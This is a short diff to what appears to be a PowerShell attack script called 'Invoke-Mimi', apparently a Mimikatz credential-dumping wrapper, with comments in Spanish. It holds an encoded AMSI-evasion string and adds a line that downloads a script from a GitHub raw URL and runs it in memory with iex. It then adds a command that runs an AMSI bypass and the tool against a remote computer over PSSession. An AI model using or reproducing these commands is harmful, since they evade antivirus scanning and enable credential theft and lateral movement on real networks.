@@ -1,4 +1,5 @@
 # Invoke-Mimi
+#By Luis Carreto
 
 #Evasion de AMSI
 
@@ -8,4 +9,9 @@ $B="1173680867656877679866880867644817687416876797271"
 
 #Ejecucion en memoria
 
-iex(New-Object Net.WebClient).DownloadString(' ')
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dr0pc/Invoke-Mimi/main/Invoke-Mimi.ps1')
+
+
+#Ejecucion remota por PSSession
+
+Invoke-Command -ScriptBlock  {AmsiBypass} ; & ${function:invoke-mimi} -ComputerName computer-name
